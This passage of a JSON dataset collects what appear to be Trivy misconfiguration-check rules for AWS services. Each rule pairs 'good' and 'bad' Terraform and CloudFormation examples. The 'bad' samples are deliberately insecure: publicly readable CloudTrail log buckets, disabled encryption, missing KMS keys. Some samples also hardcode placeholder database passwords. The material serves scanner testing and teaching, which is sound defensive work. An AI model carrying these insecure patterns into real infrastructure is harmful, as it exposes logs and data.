              "resource \"aws_cloudtrail\" \"good_example\" {\n  cloud_watch_logs_group_arn = \"${aws_cloudwatch_log_group.example.arn}:*\"\n}\n\nresource \"aws_cloudwatch_log_group\" \"example\" {\n  name = \"Example\"\n}"
            ],
            "bad": [
              "resource \"aws_cloudtrail\" \"bad_example\" {\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDTRAIL-NO_PUBLIC_LOG_ACCESS",
        "title": "No Public Log Access",
        "provider": "aws",
        "service": "cloudtrail",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExampleBucket:\n          Type: AWS::S3::Bucket\n          Properties:\n            AccessControl: Private\n            BucketName: my-bucket\n\n        GoodExampleTrail:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            IsLogging: true\n            S3BucketName: my-bucket\n            TrailName: Cloudtrail\n  bad:\n    - |-\n      Resources:\n        BadExampleBucket:\n          Type: AWS::S3::Bucket\n          Properties:\n            AccessControl: AuthenticatedRead\n            BucketName: my-bucket\n\n        BadExampleTrail:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            IsLogging: true\n            S3BucketName: my-bucket\n            TrailName: Cloudtrail\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail\n  good:\n    - |-\n      resource \"aws_cloudtrail\" \"good_example\" {\n        s3_bucket_name = aws_s3_bucket.example.id\n      }\n\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"example\"\n        acl    = \"private\"\n      }\n  bad:\n    - |-\n      resource \"aws_cloudtrail\" \"bad_example\" {\n        s3_bucket_name = aws_s3_bucket.example.id\n      }\n\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"example\"\n        acl    = \"public-read\"\n      }\n",
        "file_name": "no_public_log_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudtrail/no_public_log_access.yaml",
        "local_path": "aws/cloudtrail/no_public_log_access.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExampleBucket:\n    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: Private\n      BucketName: my-bucket\n\n  GoodExampleTrail:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      IsLogging: true\n      S3BucketName: my-bucket\n      TrailName: Cloudtrail"
            ],
            "bad": [
              "Resources:\n  BadExampleBucket:\n    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: AuthenticatedRead\n      BucketName: my-bucket\n\n  BadExampleTrail:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      IsLogging: true\n      S3BucketName: my-bucket\n      TrailName: Cloudtrail"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail"
            ],
            "good": [
              "resource \"aws_cloudtrail\" \"good_example\" {\n  s3_bucket_name = aws_s3_bucket.example.id\n}\n\nresource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n  acl    = \"private\"\n}"
            ],
            "bad": [
              "resource \"aws_cloudtrail\" \"bad_example\" {\n  s3_bucket_name = aws_s3_bucket.example.id\n}\n\nresource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n  acl    = \"public-read\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDTRAIL-REQUIRE_BUCKET_ACCESS_LOGGING",
        "title": "Require Bucket Access Logging",
        "provider": "aws",
        "service": "cloudtrail",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExampleBucket:\n          Type: AWS::S3::Bucket\n          Properties:\n            BucketName: my-bucket\n            LoggingConfiguration:\n              DestinationBucketName: logging-bucket\n              LogFilePrefix: accesslogs/\n\n        GoodExampleTrail:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            IsLogging: true\n            S3BucketName: my-bucket\n            TrailName: Cloudtrail\n  bad:\n    - |-\n      Resources:\n        BadExampleBucket:\n          Type: AWS::S3::Bucket\n          Properties:\n            BucketName: my-bucket\n\n        BadExampleTrail:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            IsLogging: true\n            S3BucketName: my-bucket\n            TrailName: Cloudtrail\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail\n  good:\n    - |-\n      resource \"aws_cloudtrail\" \"good_example\" {\n        s3_bucket_name = aws_s3_bucket.example.id\n      }\n\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"example\"\n        logging {\n          target_bucket = \"target-bucket\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_cloudtrail\" \"bad_example\" {\n        s3_bucket_name = aws_s3_bucket.example.id\n      }\n\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"example\"\n      }\n",
        "file_name": "require_bucket_access_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudtrail/require_bucket_access_logging.yaml",
        "local_path": "aws/cloudtrail/require_bucket_access_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExampleBucket:\n    Type: AWS::S3::Bucket\n    Properties:\n      BucketName: my-bucket\n      LoggingConfiguration:\n        DestinationBucketName: logging-bucket\n        LogFilePrefix: accesslogs/\n\n  GoodExampleTrail:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      IsLogging: true\n      S3BucketName: my-bucket\n      TrailName: Cloudtrail"
            ],
            "bad": [
              "Resources:\n  BadExampleBucket:\n    Type: AWS::S3::Bucket\n    Properties:\n      BucketName: my-bucket\n\n  BadExampleTrail:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      IsLogging: true\n      S3BucketName: my-bucket\n      TrailName: Cloudtrail"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail"
            ],
            "good": [
              "resource \"aws_cloudtrail\" \"good_example\" {\n  s3_bucket_name = aws_s3_bucket.example.id\n}\n\nresource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n  logging {\n    target_bucket = \"target-bucket\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_cloudtrail\" \"bad_example\" {\n  s3_bucket_name = aws_s3_bucket.example.id\n}\n\nresource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDWATCH-LOG_GROUP_CUSTOMER_KEY",
        "title": "Log Group Customer Key",
        "provider": "aws",
        "service": "cloudwatch",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Logs::LogGroup\n          Properties:\n            KmsKeyId: arn:aws:kms:us-west-2:111122223333:key/lambdalogging\n            LogGroupName: aws/lambda/goodExample\n            RetentionInDays: 30\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Logs::LogGroup\n          Properties:\n            KmsKeyId: \"\"\n            LogGroupName: aws/lambda/badExample\n            RetentionInDays: 30\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudwatch_log_group#kms_key_id\n  good:\n    - |-\n      resource \"aws_kms_key\" \"cloudwatch\" {\n        enable_key_rotation = true\n      }\n\n      resource \"aws_kms_alias\" \"cloudwatch\" {\n        name          = \"alias/cloudwatch\"\n        target_key_id = aws_kms_key.cloudwatch.key_id\n      }\n      resource \"aws_cloudwatch_log_group\" \"good_example\" {\n        name = \"good_example\"\n\n        kms_key_id = aws_kms_alias.cloudwatch.arn\n      }\n  bad:\n    - |-\n      resource \"aws_cloudwatch_log_group\" \"bad_example\" {\n        name = \"bad_example\"\n\n      }\n",
        "file_name": "log_group_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudwatch/log_group_customer_key.yaml",
        "local_path": "aws/cloudwatch/log_group_customer_key.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Logs::LogGroup\n    Properties:\n      KmsKeyId: arn:aws:kms:us-west-2:111122223333:key/lambdalogging\n      LogGroupName: aws/lambda/goodExample\n      RetentionInDays: 30"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Logs::LogGroup\n    Properties:\n      KmsKeyId: \"\"\n      LogGroupName: aws/lambda/badExample\n      RetentionInDays: 30"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudwatch_log_group#kms_key_id"
            ],
            "good": [
              "resource \"aws_kms_key\" \"cloudwatch\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_kms_alias\" \"cloudwatch\" {\n  name          = \"alias/cloudwatch\"\n  target_key_id = aws_kms_key.cloudwatch.key_id\n}\nresource \"aws_cloudwatch_log_group\" \"good_example\" {\n  name = \"good_example\"\n\n  kms_key_id = aws_kms_alias.cloudwatch.arn\n}"
            ],
            "bad": [
              "resource \"aws_cloudwatch_log_group\" \"bad_example\" {\n  name = \"bad_example\"\n\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CODEBUILD-ENABLE_ENCRYPTION",
        "title": "Enable Encryption",
        "provider": "aws",
        "service": "codebuild",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-codebuild-project.html\n  good:\n    - |-\n      Resources:\n        GoodProject:\n          Type: AWS::CodeBuild::Project\n          Properties:\n            Artifacts:\n              EncryptionDisabled: false\n            SecondaryArtifacts:\n              - EncryptionDisabled: false\n  bad:\n    - |-\n      Resources:\n        GoodProject:\n          Type: AWS::CodeBuild::Project\n          Properties:\n            Artifacts:\n              EncryptionDisabled: true\n            SecondaryArtifacts:\n              - EncryptionDisabled: false\n    - |-\n      Resources:\n        GoodProject:\n          Type: AWS::CodeBuild::Project\n          Properties:\n            Artifacts:\n              EncryptionDisabled: false\n            SecondaryArtifacts:\n              - EncryptionDisabled: true\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/codebuild_project#encryption_disabled\n  good:\n    - |-\n      resource \"aws_codebuild_project\" \"good_example\" {\n        artifacts {}\n      }\n    - |-\n      resource \"aws_codebuild_project\" \"good_example\" {\n        artifacts {\n          encryption_disabled = false\n        }\n      }\n    - |-\n      resource \"aws_codebuild_project\" \"codebuild\" {\n        secondary_artifacts {\n          encryption_disabled = false\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_codebuild_project\" \"bad_example\" {\n        artifacts {\n          encryption_disabled = true\n        }\n      }\n    - |-\n      resource \"aws_codebuild_project\" \"bad_example\" {\n        artifacts {}\n\n        secondary_artifacts {\n          encryption_disabled = true\n        }\n      }\n",
        "file_name": "enable_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/codebuild/enable_encryption.yaml",
        "local_path": "aws/codebuild/enable_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-codebuild-project.html"
            ],
            "good": [
              "Resources:\n  GoodProject:\n    Type: AWS::CodeBuild::Project\n    Properties:\n      Artifacts:\n        EncryptionDisabled: false\n      SecondaryArtifacts:\n        - EncryptionDisabled: false"
            ],
            "bad": [
              "Resources:\n  GoodProject:\n    Type: AWS::CodeBuild::Project\n    Properties:\n      Artifacts:\n        EncryptionDisabled: true\n      SecondaryArtifacts:\n        - EncryptionDisabled: false",
              "Resources:\n  GoodProject:\n    Type: AWS::CodeBuild::Project\n    Properties:\n      Artifacts:\n        EncryptionDisabled: false\n      SecondaryArtifacts:\n        - EncryptionDisabled: true"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/codebuild_project#encryption_disabled"
            ],
            "good": [
              "resource \"aws_codebuild_project\" \"good_example\" {\n  artifacts {}\n}",
              "resource \"aws_codebuild_project\" \"good_example\" {\n  artifacts {\n    encryption_disabled = false\n  }\n}",
              "resource \"aws_codebuild_project\" \"codebuild\" {\n  secondary_artifacts {\n    encryption_disabled = false\n  }\n}"
            ],
            "bad": [
              "resource \"aws_codebuild_project\" \"bad_example\" {\n  artifacts {\n    encryption_disabled = true\n  }\n}",
              "resource \"aws_codebuild_project\" \"bad_example\" {\n  artifacts {}\n\n  secondary_artifacts {\n    encryption_disabled = true\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CONFIG-AGGREGATE_ALL_REGIONS",
        "title": "Aggregate All Regions",
        "provider": "aws",
        "service": "config",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Config::ConfigurationAggregator\n          Properties:\n            AccountAggregationSources:\n              - AllAwsRegions: true\n            ConfigurationAggregatorName: GoodAccountLevelAggregation\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Config::ConfigurationAggregator\n          Properties:\n            ConfigurationAggregatorName: GoodAccountLevelAggregation\n            OrganizationAggregationSource:\n              AllAwsRegions: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Config::ConfigurationAggregator\n          Properties:\n            ConfigurationAggregatorName: BadAccountLevelAggregation\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/config_configuration_aggregator#all_regions\n  good:\n    - |-\n      resource \"aws_config_configuration_aggregator\" \"good_example\" {\n        name = \"example\"\n\n        account_aggregation_source {\n          account_ids = [\"123456789012\"]\n          all_regions = true\n        }\n      }\n    - |-\n      resource \"aws_config_configuration_aggregator\" \"good_example\" {\n        name = \"example\"\n\n        organization_aggregation_source {\n          role_arn    = \"arn:aws:iam::123456789012:role/ConfigAggregatorRole\"\n          all_regions = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_config_configuration_aggregator\" \"bad_example\" {\n        name = \"example\"\n\n        account_aggregation_source {\n          account_ids = [\"123456789012\"]\n          regions     = [\"us-west-2\", \"eu-west-1\"]\n        }\n      }\n",
        "file_name": "aggregate_all_regions.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/config/aggregate_all_regions.yaml",
        "local_path": "aws/config/aggregate_all_regions.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Config::ConfigurationAggregator\n    Properties:\n      AccountAggregationSources:\n        - AllAwsRegions: true\n      ConfigurationAggregatorName: GoodAccountLevelAggregation",
              "Resources:\n  GoodExample:\n    Type: AWS::Config::ConfigurationAggregator\n    Properties:\n      ConfigurationAggregatorName: GoodAccountLevelAggregation\n      OrganizationAggregationSource:\n        AllAwsRegions: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Config::ConfigurationAggregator\n    Properties:\n      ConfigurationAggregatorName: BadAccountLevelAggregation"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/config_configuration_aggregator#all_regions"
            ],
            "good": [
              "resource \"aws_config_configuration_aggregator\" \"good_example\" {\n  name = \"example\"\n\n  account_aggregation_source {\n    account_ids = [\"123456789012\"]\n    all_regions = true\n  }\n}",
              "resource \"aws_config_configuration_aggregator\" \"good_example\" {\n  name = \"example\"\n\n  organization_aggregation_source {\n    role_arn    = \"arn:aws:iam::123456789012:role/ConfigAggregatorRole\"\n    all_regions = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_config_configuration_aggregator\" \"bad_example\" {\n  name = \"example\"\n\n  account_aggregation_source {\n    account_ids = [\"123456789012\"]\n    regions     = [\"us-west-2\", \"eu-west-1\"]\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-DOCUMENTDB-ENABLE_LOG_EXPORT",
        "title": "Enable Log Export",
        "provider": "aws",
        "service": "documentdb",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-docdb-dbcluster.html\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::DocDB::DBCluster\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBClusterParameterGroupName: default.docdb3.6\n            EnableCloudwatchLogsExports:\n              - audit\n              - profiler\n\n        InstanceInstanceExample:\n          Type: AWS::DocDB::DBInstance\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBInstanceClass: db.r5.large\n            DBInstanceIdentifier: sample-cluster-instance-0\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::DocDB::DBCluster\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBClusterParameterGroupName: default.docdb3.6\n\n        BadInstanceExample:\n          Type: AWS::DocDB::DBInstance\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBInstanceClass: db.r5.large\n            DBInstanceIdentifier: sample-cluster-instance-0\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#enabled_cloudwatch_logs_exports\n  good:\n    - |-\n      resource \"aws_docdb_cluster\" \"good_example\" {\n        cluster_identifier              = \"my-docdb-cluster\"\n        master_username                 = \"foo\"\n        master_password                 = \"mustbeeightchars\"\n        enabled_cloudwatch_logs_exports = \"audit\"\n      }\n    - |-\n      resource \"aws_docdb_cluster\" \"good_example\" {\n        cluster_identifier              = \"my-docdb-cluster\"\n        master_username                 = \"foo\"\n        master_password                 = \"mustbeeightchars\"\n        enabled_cloudwatch_logs_exports = \"profiler\"\n      }\n  bad:\n    - |-\n      resource \"aws_docdb_cluster\" \"bad_example\" {\n        cluster_identifier              = \"my-docdb-cluster\"\n        master_username                 = \"foo\"\n        master_password                 = \"mustbeeightchars\"\n        enabled_cloudwatch_logs_exports = \"something\"\n      }\n",
        "file_name": "enable_log_export.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/documentdb/enable_log_export.yaml",
        "local_path": "aws/documentdb/enable_log_export.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-docdb-dbcluster.html"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::DocDB::DBCluster\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBClusterParameterGroupName: default.docdb3.6\n      EnableCloudwatchLogsExports:\n        - audit\n        - profiler\n\n  InstanceInstanceExample:\n    Type: AWS::DocDB::DBInstance\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBInstanceClass: db.r5.large\n      DBInstanceIdentifier: sample-cluster-instance-0"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::DocDB::DBCluster\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBClusterParameterGroupName: default.docdb3.6\n\n  BadInstanceExample:\n    Type: AWS::DocDB::DBInstance\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBInstanceClass: db.r5.large\n      DBInstanceIdentifier: sample-cluster-instance-0"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#enabled_cloudwatch_logs_exports"
            ],
            "good": [
              "resource \"aws_docdb_cluster\" \"good_example\" {\n  cluster_identifier              = \"my-docdb-cluster\"\n  master_username                 = \"foo\"\n  master_password                 = \"mustbeeightchars\"\n  enabled_cloudwatch_logs_exports = \"audit\"\n}",
              "resource \"aws_docdb_cluster\" \"good_example\" {\n  cluster_identifier              = \"my-docdb-cluster\"\n  master_username                 = \"foo\"\n  master_password                 = \"mustbeeightchars\"\n  enabled_cloudwatch_logs_exports = \"profiler\"\n}"
            ],
            "bad": [
              "resource \"aws_docdb_cluster\" \"bad_example\" {\n  cluster_identifier              = \"my-docdb-cluster\"\n  master_username                 = \"foo\"\n  master_password                 = \"mustbeeightchars\"\n  enabled_cloudwatch_logs_exports = \"something\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-DOCUMENTDB-ENABLE_STORAGE_ENCRYPTION",
        "title": "Enable Storage Encryption",
        "provider": "aws",
        "service": "documentdb",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-docdb-dbcluster.html\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::DocDB::DBCluster\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBClusterParameterGroupName: default.docdb3.6\n            StorageEncrypted: true\n\n        InstanceInstanceExample:\n          Type: AWS::DocDB::DBInstance\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBInstanceClass: db.r5.large\n            DBInstanceIdentifier: sample-cluster-instance-0\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::DocDB::DBCluster\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBClusterParameterGroupName: default.docdb3.6\n\n        BadInstanceExample:\n          Type: AWS::DocDB::DBInstance\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBInstanceClass: db.r5.large\n            DBInstanceIdentifier: sample-cluster-instance-0\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#storage_encrypted\n  good:\n    - |-\n      resource \"aws_docdb_cluster\" \"good_example\" {\n        cluster_identifier = \"my-docdb-cluster\"\n        master_username    = \"foo\"\n        master_password    = \"mustbeeightchars\"\n        storage_encrypted  = true\n      }\n  bad:\n    - |-\n      resource \"aws_docdb_cluster\" \"bad_example\" {\n        cluster_identifier = \"my-docdb-cluster\"\n        master_username    = \"foo\"\n        master_password    = \"mustbeeightchars\"\n        storage_encrypted  = false\n      }\n",
        "file_name": "enable_storage_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/documentdb/enable_storage_encryption.yaml",
        "local_path": "aws/documentdb/enable_storage_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-docdb-dbcluster.html"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::DocDB::DBCluster\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBClusterParameterGroupName: default.docdb3.6\n      StorageEncrypted: true\n\n  InstanceInstanceExample:\n    Type: AWS::DocDB::DBInstance\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBInstanceClass: db.r5.large\n      DBInstanceIdentifier: sample-cluster-instance-0"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::DocDB::DBCluster\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBClusterParameterGroupName: default.docdb3.6\n\n  BadInstanceExample:\n    Type: AWS::DocDB::DBInstance\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBInstanceClass: db.r5.large\n      DBInstanceIdentifier: sample-cluster-instance-0"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#storage_encrypted"
            ],
            "good": [
              "resource \"aws_docdb_cluster\" \"good_example\" {\n  cluster_identifier = \"my-docdb-cluster\"\n  master_username    = \"foo\"\n  master_password    = \"mustbeeightchars\"\n  storage_encrypted  = true\n}"
            ],
            "bad": [
              "resource \"aws_docdb_cluster\" \"bad_example\" {\n  cluster_identifier = \"my-docdb-cluster\"\n  master_username    = \"foo\"\n  master_password    = \"mustbeeightchars\"\n  storage_encrypted  = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-DOCUMENTDB-ENCRYPTION_CUSTOMER_KEY",
        "title": "Encryption Customer Key",
        "provider": "aws",
        "service": "documentdb",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-docdb-dbcluster.html\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::DocDB::DBCluster\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBClusterParameterGroupName: default.docdb3.6\n            KmsKeyId: your-kms-key-id\n\n        InstanceInstanceExample:\n          Type: AWS::DocDB::DBInstance\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBInstanceClass: db.r5.large\n            DBInstanceIdentifier: sample-cluster-instance-0\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::DocDB::DBCluster\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBClusterParameterGroupName: default.docdb3.6\n\n        BadInstanceExample:\n          Type: AWS::DocDB::DBInstance\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBInstanceClass: db.r5.large\n            DBInstanceIdentifier: sample-cluster-instance-0\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#kms_key_id\n  good:\n    - |-\n      resource \"aws_kms_key\" \"docdb_encryption\" {\n        enable_key_rotation = true\n      }\n\n      resource \"aws_docdb_cluster\" \"docdb\" {\n        cluster_identifier = \"my-docdb-cluster\"\n        master_username    = \"foo\"\n        master_password    = \"mustbeeightchars\"\n        kms_key_id         = aws_kms_key.docdb_encryption.arn\n      }\n  bad:\n    - |-\n      resource \"aws_docdb_cluster\" \"docdb\" {\n        cluster_identifier  = \"my-docdb-cluster\"\n        master_username     = \"foo\"\n        master_password     = \"mustbeeightchars\"\n        skip_final_snapshot = true\n      }\n",
        "file_name": "encryption_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/documentdb/encryption_customer_key.yaml",
        "local_path": "aws/documentdb/encryption_customer_key.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-docdb-dbcluster.html"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::DocDB::DBCluster\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBClusterParameterGroupName: default.docdb3.6\n      KmsKeyId: your-kms-key-id\n\n  InstanceInstanceExample:\n    Type: AWS::DocDB::DBInstance\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBInstanceClass: db.r5.large\n      DBInstanceIdentifier: sample-cluster-instance-0"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::DocDB::DBCluster\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBClusterParameterGroupName: default.docdb3.6\n\n  BadInstanceExample:\n    Type: AWS::DocDB::DBInstance\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBInstanceClass: db.r5.large\n      DBInstanceIdentifier: sample-cluster-instance-0"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#kms_key_id"
            ],
            "good": [
              "resource \"aws_kms_key\" \"docdb_encryption\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_docdb_cluster\" \"docdb\" {\n  cluster_identifier = \"my-docdb-cluster\"\n  master_username    = \"foo\"\n  master_password    = \"mustbeeightchars\"\n  kms_key_id         = aws_kms_key.docdb_encryption.arn\n}"
            ],
            "bad": [
              "resource \"aws_docdb_cluster\" \"docdb\" {\n  cluster_identifier  = \"my-docdb-cluster\"\n  master_username     = \"foo\"\n  master_password     = \"mustbeeightchars\"\n  skip_final_snapshot = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-DYNAMODB-ENABLE_AT_REST_ENCRYPTION",
        "title": "Enable At Rest Encryption",
        "provider": "aws",
        "service": "dynamodb",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::DAX::Cluster\n          Properties:\n            ClusterName: MyDAXCluster\n            IAMRoleARN: arn:aws:iam::111122223333:role/DaxAccess\n            NodeType: dax.r3.large\n            ReplicationFactor: 1\n            SSESpecification:\n              SSEEnabled: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::DAX::Cluster\n          Properties:\n            ClusterName: MyDAXCluster\n            IAMRoleARN: arn:aws:iam::111122223333:role/DaxAccess\n            NodeType: dax.r3.large\n            ReplicationFactor: 1\n            SubnetGroupName: !Ref subnetGroupClu\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dax_cluster#server_side_encryption\n  good:\n    - |-\n      resource \"aws_dax_cluster\" \"good_example\" {\n        server_side_encryption {\n          enabled = true // enabled server side encryption\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_dax_cluster\" \"bad_example\" {\n        // no server side encryption at all\n      }\n    - |-\n      resource \"aws_dax_cluster\" \"bad_example\" {\n        server_side_encryption {\n          // empty server side encryption config\n        }\n      }\n    - |-\n      resource \"aws_dax_cluster\" \"bad_example\" {\n        server_side_encryption {\n          enabled = false // disabled server side encryption\n        }\n      }\n",
        "file_name": "enable_at_rest_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/dynamodb/enable_at_rest_encryption.yaml",
        "local_path": "aws/dynamodb/enable_at_rest_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
